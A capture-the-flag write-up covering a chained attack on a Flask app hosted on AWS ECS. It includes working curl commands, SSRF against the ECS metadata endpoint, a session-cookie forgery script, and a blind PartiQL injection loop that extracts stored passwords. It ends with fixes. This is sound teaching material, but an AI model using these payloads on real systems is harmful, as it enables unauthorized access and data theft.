# Cloud Nine - Chained Cloud Exploitation

Cupid has gone rogue. What was meant to spread love is now being weaponized. Investigate the Cupid's Arrow application, discover how this fallen angel is manipulating the system, and find the flags hidden in Cloud Nine.

`Cloud` `Web` `SSRF` `Flask Session Forgery` `DynamoDB` `PartiQL Injection` `ECS Fargate`

## Overview

This challenge chains four vulnerabilities across a Flask web app running on AWS ECS Fargate:

```
Weak credentials ──> Public Docker image ──> Source code leak (SECRET_KEY + FLAG1)
     ──> Flask session forgery ──> Admin panel (FLAG2)
          ──> SSRF ──> ECS metadata discovery
               ──> PartiQL injection ──> Blind data extraction (FLAG3)
```

## Reconnaissance

The target is a Flask application on `http://54.205.77.77:8080/` (Werkzeug 3.1.5 / Python 3.12.12).

### Login with Default Credentials

The login page requires credentials. Testing common defaults:

```sh
curl -s -X POST http://54.205.77.77:8080/login \
  -d 'username=guest&password=guest' -i | head -10
```

`guest:guest` works. The response sets a Flask session cookie:

```
Set-Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXIiOiJndWVzdCJ9...
```

Decoding the base64 payload:

```json
{"admin": false, "user": "guest"}
```

The session contains an `admin` flag set to `false`. If we can forge a cookie with `admin: true`, we get admin access.

### Route Discovery

| Route | Status | Description |
|-------|--------|-------------|
| `/` | 200 | Main app (arrow map) |
| `/login` | 200 | Authentication |
| `/admin` | 302 | Redirects to `/login` without admin session |
| `/shoot` | POST | Arrow strike API |
| `/status` | 200 | **System status page with SSRF** |
| `/status/check?url=` | 200 | **URL fetch endpoint (SSRF)** |
| `/status/env` | 200 | Server environment (leaks hostname) |

### ECS Metadata via SSRF

The `/status/check` endpoint fetches any URL from the server side. The `/status/env` reveals:

```json
{"env": [{"key": "HOSTNAME", "value": "ip-172-31-93-102.ec2.internal"}]}
```

The hostname pattern `ip-172-31-x-x.ec2.internal` confirms this is running on **AWS**. Testing the ECS metadata endpoint:

```sh
curl -s "http://54.205.77.77:8080/status/check?url=http://169.254.170.2/v2/metadata"
```

This returns the full ECS task metadata, revealing:

```json
{
  "Cluster": "arn:aws:ecs:us-east-1:702126839589:cluster/cloudnine-cluster",
  "Family": "cloudnine-task",
  "LaunchType": "FARGATE",
  "Containers": [{
    "Image": "public.ecr.aws/x2q4d0z7/cloudnine-app:latest"
  }]
}
```

The Docker image is **publicly accessible** on ECR Public.

---

## Step 1 — Source Code Leak (FLAG1)

### Pulling the Public Docker Image

The image `public.ecr.aws/x2q4d0z7/cloudnine-app:latest` is public. We pull it and extract the source:

```sh
docker pull public.ecr.aws/x2q4d0z7/cloudnine-app:latest
docker create --name extract public.ecr.aws/x2q4d0z7/cloudnine-app:latest
docker cp extract:/app /tmp/cloudnine-app
```

### What's in the Source Code

The file `/app/app.py` contains:

```python
app.secret_key = "change-me-in-production-but-for-real-this-time-please-no-kidding"

FLAG2 = os.getenv("FLAG2", "THM{test_flag}")

# remember you can use these credentials to test the login page:
# username: test
# password: cup1dkuPiDqup!d
# FLAG1: THM{aaaa}
```

Three critical finds:

1. **FLAG1** is in a code comment: `THM{aaa}`
2. **Flask SECRET_KEY** is hardcoded — we can forge session cookies
3. **FLAG2** is loaded from an environment variable and displayed on the admin page

> **Beginner note**: Never commit secrets, flags, or credentials in source code comments. And never use a hardcoded `secret_key` — it should come from environment variables and be randomly generated.

---

## Step 2 — Flask Session Forgery (FLAG2)

### Forging an Admin Cookie

With the `secret_key`, we can sign any session data we want:

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "change-me-in-production-but-for-real-this-time-please-no-kidding"

si = SecureCookieSessionInterface()
serializer = si.get_signing_serializer(app)

cookie = serializer.dumps({"admin": True, "user": "guest"})
print(f"session={cookie}")
```

### Accessing the Admin Panel

```sh
curl -s -b "session=<forged_cookie>" http://54.205.77.77:8080/admin
```

The admin panel renders, including FLAG2:

```
FLAG2: THM{aaaFLAG2}
```

> **Beginner note**: Flask session cookies are **signed but not encrypted**. Anyone can decode the payload (it's just base64). The signature prevents tampering — unless the secret key is leaked. Always use a strong, random secret key.

### What the Admin Panel Does

The admin panel has a user lookup feature that accepts a username and queries DynamoDB using **PartiQL** (a SQL-like query language):

```python
response = dynamodb.meta.client.execute_statement(
    Statement="SELECT * FROM \"" + USERS_TABLE + "\" WHERE username = '" + username + "'"
)
```

The username is **concatenated directly** into the PartiQL statement — classic SQL injection, but in DynamoDB.

---

## Step 3 — Blind PartiQL Injection (FLAG3)

### Understanding the Injection

The query becomes:

```sql
SELECT * FROM "cupid-users" WHERE username = '<user_input>'
```

By injecting into the username field, we can modify the WHERE clause. For example:

```
Input:  nonexistent' OR username='cupid
Query:  SELECT * FROM "cupid-users" WHERE username = 'nonexistent' OR username='cupid'
```

This returns the `cupid` user's record. The admin panel displays the username, full_name, email, and admin status — but **not the password**.

### Discovering Users

Testing known usernames through the admin lookup:

| Username | Found | Details |
|----------|-------|---------|
| `guest` | Yes | Full name: AAAAA |
| `test` | Yes | Full name: Test Account |
| `cupid` | Yes | Full name: The one and only Cupid |
| `admin` | No | — |
| `flag` | No | — |

### Blind Extraction of Hidden Fields

DynamoDB records can have fields beyond what the app displays. We can test conditions on hidden fields using blind injection:

```
Input:  nonexistent' OR (username='cupid' AND begins_with(password,'THM{')) OR '1'='2
Query:  ...WHERE username = 'nonexistent' OR (username='cupid' AND begins_with(password,'THM{')) OR '1'='2'
```

- If the condition is **true**: the query returns the cupid user → "User loaded"
- If **false**: no match → "User not found"

Testing if cupid's password starts with `THM{`:

```sh
curl -s -X POST http://54.205.77.77:8080/admin \
  -b "session=<admin_cookie>" \
  -d "action=lookup" \
  --data-urlencode "username=nonexistent' OR (username='cupid' AND begins_with(password,'THM{')) OR '1'='2"
```

Response: **"User loaded"** — the password IS a flag!

### Extracting the Full Flag

Character-by-character extraction using `begins_with()`:

```bash
FLAG="THM{"
CHARSET="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-}"

while true; do
  for c in $(echo "$CHARSET" | fold -w1); do
    test_str="${FLAG}${c}"
    result=$(curl -s -X POST http://54.205.77.77:8080/admin \
      -b "session=<admin_cookie>" \
      -d "action=lookup" \
      --data-urlencode "username=nonexistent' OR (username='cupid' AND begins_with(password,'$test_str')) OR '1'='2" \
      | grep -c "User loaded")
    if [ "$result" -gt 0 ]; then
      FLAG="${test_str}"
      echo "Found: $FLAG"
      break
    fi
  done
  echo "$FLAG" | grep -q '}$' && break
done
```

```
Found: THM{p
Found: THM{pa
Found: THM{par
...
Found: THM{aaaaa}
FLAG COMPLETE: THM{aaaa}
```

---

## Flags

| Flag | Value | Method |
|------|-------|--------|
| FLAG1 | `THM{aaaaaa}` | Public Docker image → source code comments |
| FLAG2 | `THM{aaaaa}` | Flask session forgery → admin panel |
| FLAG3 | `THM{aaaa}` | Blind PartiQL injection on DynamoDB |

## Root Cause Summary

| Vulnerability | Impact | Fix |
|--------------|--------|-----|
| **Default credentials** (`guest:guest`) | Unauthorized application access | Enforce strong password policies, no default accounts |
| **Public Docker image with source code** | SECRET_KEY and credentials leaked | Use private registries, never hardcode secrets |
| **Hardcoded Flask SECRET_KEY** | Session forgery, admin impersonation | Use environment variables with random secrets |
| **SSRF in status check** | Internal service discovery, ECS metadata leak | Validate and whitelist target URLs, use IMDSv2 with hop limit |
| **PartiQL injection** | Blind data extraction from DynamoDB | Use parameterized queries, never concatenate user input |

## Key Takeaways

1. **Public container registries are goldmines** — always check if Docker images are publicly accessible. They often contain source code, secrets, and configuration.
2. **Flask secret keys must be truly secret** — a leaked key means full session forgery. Use `os.urandom(32).hex()` and store it in environment variables.
3. **SSRF on cloud = metadata access** — ECS containers expose task metadata at `169.254.170.2`. Always restrict outbound network access and use metadata endpoint protections.
4. **NoSQL injection exists too** — DynamoDB's PartiQL is SQL-like and vulnerable to injection when user input is concatenated into queries. Use parameterized statements.
5. **Blind injection is powerful** — even without seeing the data directly, boolean-based blind injection can extract entire fields character by character using functions like `begins_with()`.


author: bloman